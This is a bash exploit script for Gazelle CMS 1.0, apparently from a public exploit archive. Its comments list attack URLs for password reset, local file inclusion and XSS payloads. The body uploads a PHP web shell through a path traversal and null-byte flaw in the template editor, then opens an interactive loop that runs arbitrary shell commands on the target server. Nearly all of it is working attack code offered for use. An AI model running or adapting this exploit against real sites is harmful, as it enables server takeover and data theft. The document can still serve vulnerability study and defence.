Gazelle CMS 1.0 Multiple Vulnerabilities / RCE Exploit
======================================================


#!/bin/bash
#       Gazelle CMS 1.0 Multiple Vulnerabilities
#       Script Download: http://www.anantasoft.com/index.php?Gazelle%20CMS/Download
#       Found by white_sheep on 11/08/2009
#       Contact: sheewhite@googlemail.com - https://www.ihteam.net
#       Need magic_quote_gpc Off for RCE and LFI
#       Thanks to R00T[ATI]
#
#               PASSWORD RESET:
# http://localhost/gazelle/renew.php?user=[username]
#
#               LFI:
# http://localhost/gazelle/index.php?template=[LFI]
#
#               XSS:
# http://localhost/gazelle/user.php?user=</title>[XSS]
# http://localhost/gazelle/search.php?lookup=<script+type="text/javascript">[CODE]</script>
#
#               RCE:
echo
echo "###############################################"
echo "#             GazelleCMS 1.0 RCE              #"
echo "###############################################"
echo


EVILC=&#039;<?php passthru($_GET[cmd]); ?>&#039;

echo -n "Insert url with path (ex.: http://localhost/gazelle): " 
read SITE

PAGENAME=/modules/menu$RANDOM&#039;.bak.php&#039;

curl -F "siteTitle=&#039;INIT&#039;$EVILC&#039;EOF&#039;;type=text/html" $SITE&#039;/admin/settemplate.php?customizetemplate=..&#039;$PAGENAME&#039;%00&#039; 1>/dev/null 2>/dev/null

if [ "`curl -s $SITE&#039;&#039;$PAGENAME | grep siteTitle`" == "" ]
then 
	echo "[-] Not Vulnerable :( byee"
	exit
fi

while true
do
	echo -n "sh$: "
	read -r CMD
	CMD=`echo $CMD | sed &#039;s/ /+/g&#039;`
	echo $CMD
	curl -s "$SITE$PAGENAME?cmd=$CMD" | sed "s/.*&#039;INIT&#039;//g;s/&#039;EOF&#039;.*//g"
	echo
done




